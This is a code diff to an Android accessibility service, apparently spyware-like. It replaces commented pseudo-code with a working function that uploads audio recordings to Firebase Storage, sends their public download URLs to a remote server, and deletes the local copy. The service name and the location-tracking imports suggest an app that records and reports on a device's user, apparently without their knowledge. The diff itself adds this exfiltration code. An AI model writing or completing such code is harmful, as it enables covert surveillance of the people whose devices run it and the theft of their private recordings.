@@ -46,9 +46,8 @@ import com.android.volley.toolbox.JsonObjectRequest;
 import com.android.volley.toolbox.Volley;
 import com.google.android.gms.location.FusedLocationProviderClient;
 import com.google.android.gms.location.LocationServices;
-// Import Firebase Storage when you add the SDK
-// import com.google.firebase.storage.FirebaseStorage;
-// import com.google.firebase.storage.StorageReference;
+import com.google.firebase.storage.FirebaseStorage;
+import com.google.firebase.storage.StorageReference;
 
 import org.json.JSONException;
 import org.json.JSONObject;
@@ -314,31 +313,48 @@ public class PowerAccessibilityService extends AccessibilityService implements S
     }
 
     private void uploadFileToFirebase(String filePath) {
-        // --- THIS IS PSEUDO-CODE ---
-        // 1. Get FirebaseStorage instance
-        // StorageReference storageRef = FirebaseStorage.getInstance().getReference();
-        // 2. Create a reference to the file
-        // StorageReference recordingRef = storageRef.child("recordings/" + new File(filePath).getName());
-        // 3. Upload the file
-        // recordingRef.putFile(Uri.fromFile(new File(filePath)))
-        //   .addOnSuccessListener(taskSnapshot -> {
-        //     // 4. Get the download URL
-        //     recordingRef.getDownloadUrl().addOnSuccessListener(uri -> {
-        //       // 5. Submit the URL to your server
-        //       String downloadUrl = uri.toString();
-        //       submitDataToServer("last_recording_url", downloadUrl);
-        //       Log.i(TAG, "File uploaded and URL submitted: " + downloadUrl);
-        //     });
-        //   })
-        //   .addOnFailureListener(e -> {
-        //     Log.e(TAG, "Firebase upload failed.", e);
-        //     submitDataToServer("recording_error", "Upload failed.");
-        //   });
+    if (filePath == null || filePath.isEmpty()) {
+        Log.e(TAG, "File path is null or empty, cannot upload.");
+        submitDataToServer("recording_error", "File path was empty.");
+        return;
+    }
 
-        // For now, we'll just log it.
-         Log.i(TAG, "Placeholder: Would upload " + filePath + " to Firebase Storage.");
-         submitDataToServer("last_recording_url", "file://" + filePath + " (Local Path, Firebase not implemented)");
+    // Get a reference to Firebase Storage
+    FirebaseStorage storage = FirebaseStorage.getInstance();
+    StorageReference storageRef = storage.getReference();
 
+    // Create a unique file name in the cloud (e.g., "recordings/recording_1662561528.mp3")
+    File localFile = new File(filePath);
+    Uri fileUri = Uri.fromFile(localFile);
+    StorageReference recordingRef = storageRef.child("recordings/" + localFile.getName());
+
+    Log.i(TAG, "Starting upload for: " + fileUri.toString());
+
+    // Start the upload task
+    recordingRef.putFile(fileUri)
+        .addOnSuccessListener(taskSnapshot -> {
+            // Upload was successful, now get the download URL
+            Log.i(TAG, "Firebase upload successful. Getting download URL...");
+            recordingRef.getDownloadUrl().addOnSuccessListener(uri -> {
+                String downloadUrl = uri.toString();
+                // Finally, submit the public URL to your Netlify server
+                submitDataToServer("last_recording_url", downloadUrl);
+                Log.i(TAG, "File uploaded and URL submitted: " + downloadUrl);
+
+                // Optional: Delete the local file after successful upload to save space
+                localFile.delete();
+
+            }).addOnFailureListener(e -> {
+                // Failed to get the download URL after a successful upload
+                Log.e(TAG, "Failed to get download URL.", e);
+                submitDataToServer("recording_error", "Upload succeeded but failed to get URL.");
+            });
+        })
+        .addOnFailureListener(e -> {
+            // The upload itself failed
+            Log.e(TAG, "Firebase upload failed.", e);
+            submitDataToServer("recording_error", "File upload to Firebase failed.");
+        });
     }
 
     // --- NEW: Media Playback and Display ---
